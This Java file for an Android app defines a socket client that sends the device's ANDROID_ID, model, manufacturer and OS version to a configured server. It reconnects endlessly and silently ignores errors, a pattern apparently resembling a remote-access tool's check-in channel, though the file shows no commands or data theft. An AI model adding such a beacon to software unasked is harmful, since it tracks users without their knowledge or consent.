package com.fason.app.core.network;

import android.provider.Settings;

import com.fason.app.core.FasonApp;
import com.fason.app.core.config.Config;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

import io.socket.client.IO;
import io.socket.client.Socket;

public class SocketClient {

    private static final SocketClient INSTANCE = new SocketClient();
    private Socket socket;

    private SocketClient() {
        init();
    }

    private synchronized void init() {
        try {
            String deviceId = Settings.Secure.getString(
                FasonApp.getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null) deviceId = "unknown";

            String query = String.format("model=%s&manf=%s&release=%s&id=%s",
                encode(android.os.Build.MODEL),
                encode(android.os.Build.MANUFACTURER),
                encode(android.os.Build.VERSION.RELEASE),
                encode(deviceId));

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 5000;
            opts.timeout = 30000;
            opts.query = query;
            opts.secure = Config.USE_HTTPS;

            socket = IO.socket(Config.SERVER_HOST, opts);
        } catch (Exception ignored) {}
    }

    private String encode(String s) {
        try {
            return URLEncoder.encode(s != null ? s : "", "UTF-8");
        } catch (UnsupportedEncodingException e) {
            return s != null ? s : "";
        }
    }

    public static SocketClient getInstance() { return INSTANCE; }

    public synchronized Socket getSocket() {
        if (socket == null) init();
        return socket;
    }
}
